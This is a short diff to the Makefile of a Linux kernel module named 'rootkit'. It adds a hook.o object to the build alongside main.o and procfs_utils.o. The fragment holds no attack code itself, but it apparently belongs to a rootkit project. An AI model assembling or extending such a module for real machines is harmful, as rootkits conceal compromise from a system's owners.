@@ -1,5 +1,5 @@
 TARGET = rootkit
-rootkit-objs = main.o procfs_utils.o
+rootkit-objs = main.o procfs_utils.o hook.o
 obj-m := $(TARGET).o
 
 PWD := $(shell pwd)
